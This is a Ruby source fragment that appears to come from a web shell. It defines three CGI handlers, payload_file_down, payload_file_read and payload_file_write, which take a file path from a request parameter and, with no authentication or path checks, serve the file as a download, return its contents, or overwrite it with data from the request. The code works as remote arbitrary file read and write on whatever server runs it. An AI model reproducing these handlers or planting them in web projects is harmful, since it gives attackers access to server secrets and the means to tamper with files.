def payload_file_down json
    Dir.chdir @cwd
    dl_file = json['args[file]'].first

    if File.exist? dl_file
        puts @cgi.header(
            'Content-Disposition'       => 'attachment; filename=' + File.basename(dl_file),
            'Content-Transfer-Encoding' => 'binary',
        );
        puts File.read(dl_file)
    else
        puts "File does not exist"
    end
end

def payload_file_read json
    Dir.chdir @cwd
    dl_file = json['args[file]'].first

    unless File.readable? dl_file
        @response['error'] = 'File is not readable or does not exist.'
    else
        @response['output'] = {
            'output' => File.read(dl_file),
            'file'   => File.realpath(dl_file),
        }
    end

    self.send_response
end

def payload_file_write json
    Dir.chdir @cwd
    write_file = json['args[file]'].first

    if File.writable? write_file
        File.open(write_file, 'w') {|f| f.write(json['args[data]'].first) }
        @response['output'] = 'Write successful'
    else
        @response['error'] = 'Failed. File may not be writable, or may not exist.'
    end
    self.send_response
end
